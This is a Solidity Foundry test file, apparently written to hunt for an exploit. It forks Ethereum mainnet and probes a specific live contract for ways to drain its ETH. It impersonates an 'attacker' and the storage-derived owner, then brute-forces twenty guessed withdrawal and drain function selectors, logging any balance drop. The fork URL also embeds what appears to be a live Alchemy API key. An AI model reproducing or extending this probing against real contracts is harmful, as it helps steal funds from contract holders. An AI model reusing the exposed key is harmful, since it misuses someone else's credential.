// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract MoonCatsExploit2 is Test {
    address constant MOONCAT = 0x60cd862c9C687A9dE49aecdC3A99b74A4fc54aB6;
    address attacker;

    function setUp() public {
        vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/pLXdY7rYRY10SH_UTLBGH");
        attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);
    }

    function test_moonCatsWithdraw() public {
        console.log("=== MoonCats Withdraw Test ===");
        console.log("Contract balance:", MOONCAT.balance / 1e18, "ETH");

        // Check storage slot 0 for owner
        bytes32 slot0 = vm.load(MOONCAT, bytes32(uint256(0)));
        console.log("Slot 0:");
        console.logBytes32(slot0);

        // Extract address from packed storage
        address owner = address(uint160(uint256(slot0) >> 8));
        console.log("Potential owner:", owner);

        // Try withdraw as random attacker
        uint256 attackerBefore = attacker.balance;
        uint256 contractBefore = MOONCAT.balance;

        vm.prank(attacker);
        (bool s,) = MOONCAT.call(abi.encodeWithSignature("withdraw()"));
        console.log("withdraw() as attacker:", s);
        console.log("Attacker balance change:", int256(attacker.balance) - int256(attackerBefore));

        // Try as owner
        vm.prank(owner);
        (s,) = MOONCAT.call(abi.encodeWithSignature("withdraw()"));
        console.log("withdraw() as owner:", s);
        console.log("Contract balance after:", MOONCAT.balance / 1e18, "ETH");
        console.log("Owner balance:", owner.balance / 1e18, "ETH");

        if (MOONCAT.balance < contractBefore) {
            console.log("!!! WITHDRAWAL HAPPENED !!!");
        }
    }

    function test_analyzeOwner() public view {
        console.log("=== MoonCats Owner Analysis ===");

        // Check multiple storage slots for owner patterns
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(MOONCAT, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("Slot", i);
                console.logBytes32(slot);
            }
        }

        // Try to decode potential addresses
        bytes32 slot0 = vm.load(MOONCAT, bytes32(uint256(0)));

        // Try different extraction methods
        address addr1 = address(uint160(uint256(slot0)));
        address addr2 = address(uint160(uint256(slot0) >> 8));
        address addr3 = address(uint160(uint256(slot0) >> 96));

        console.log("\nPotential addresses:");
        console.log("Method 1 (low 160):", addr1);
        console.log("Method 2 (shift 8):", addr2);
        console.log("Method 3 (shift 96):", addr3);

        console.log("\nBalances:");
        console.log("addr1 balance:", addr1.balance);
        console.log("addr2 balance:", addr2.balance);
        console.log("addr3 balance:", addr3.balance);
    }

    function test_tryAllFunctions() public {
        console.log("=== Testing All Callable Functions ===");

        uint256 contractBefore = MOONCAT.balance;

        // Get potential owner
        bytes32 slot0 = vm.load(MOONCAT, bytes32(uint256(0)));
        address owner = address(uint160(uint256(slot0) >> 8));

        bytes4[20] memory funcs = [
            bytes4(keccak256("withdraw()")),
            bytes4(keccak256("withdrawBalance()")),
            bytes4(keccak256("withdrawAll()")),
            bytes4(keccak256("collectEther()")),
            bytes4(keccak256("drain()")),
            bytes4(keccak256("sweep()")),
            bytes4(keccak256("refund()")),
            bytes4(keccak256("emergencyWithdraw()")),
            bytes4(keccak256("rescue()")),
            bytes4(keccak256("claimEther()")),
            bytes4(keccak256("transferEther(address,uint256)")),
            bytes4(keccak256("send(address,uint256)")),
            bytes4(keccak256("transfer(address,uint256)")),
            bytes4(keccak256("withdrawTo(address)")),
            bytes4(keccak256("withdrawEther()")),
            bytes4(keccak256("payable()")),
            bytes4(keccak256("collect()")),
            bytes4(keccak256("harvest()")),
            bytes4(keccak256("claim()")),
            bytes4(keccak256("exit()"))
        ];

        // Try as owner
        for (uint i = 0; i < 20; i++) {
            vm.prank(owner);
            MOONCAT.call(abi.encodeWithSelector(funcs[i]));

            vm.prank(owner);
            MOONCAT.call(abi.encodeWithSelector(funcs[i], owner));

            vm.prank(owner);
            MOONCAT.call(abi.encodeWithSelector(funcs[i], owner, MOONCAT.balance));

            if (MOONCAT.balance < contractBefore) {
                console.log("!!! WITHDRAWAL via function index:", i);
                console.log("Withdrawn:", (contractBefore - MOONCAT.balance) / 1e18, "ETH");
                return;
            }
        }

        console.log("No withdrawal found");
    }
}
